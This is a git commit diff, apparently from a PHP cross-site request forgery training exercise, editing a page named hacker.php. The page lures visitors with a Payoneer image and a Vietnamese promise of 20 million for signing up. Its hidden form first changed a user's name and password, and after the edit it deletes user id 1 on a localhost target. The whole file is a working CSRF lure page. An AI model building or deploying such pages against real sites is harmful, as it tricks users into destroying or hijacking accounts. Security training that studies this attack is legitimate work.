c3ceef4142ccf118842fca820ea3f65d4c1ba841
huyvo79 <vohaanhhuy79@gmail.com>
2025-09-24 19:59:22 +0700

    cpmmit

--- hacker/hacker.php
+++ hacker/hacker.php
@@ -9,11 +9,9 @@
 </head>
 <body>
     <img src="https://quocmedia.com/wp-content/uploads/2023/07/Dang-ky-PAyoner.jpg" alt="">
-    <form action="http://localhost:8080/11-training-php-csrf/form_user.php" method="POST"> 
+    <form action="http://localhost:8080/11-training-php-csrf/delete_user.php" method="get"> 
         đăng ký thành công nhận ngay 20 tr
-        <input  type="hidden" name="name"  value="ban da bi hack!!">
-        <input type="hidden" name="id" >
-        <input type="hidden" name="password" class="form-control" value="1234">
+        <input type="hidden" name="id" value="1" >
         <button type="submit" name="submit" value="submit" class="btn btn-primary">Đăng ký</button>
     </form>
 </body>
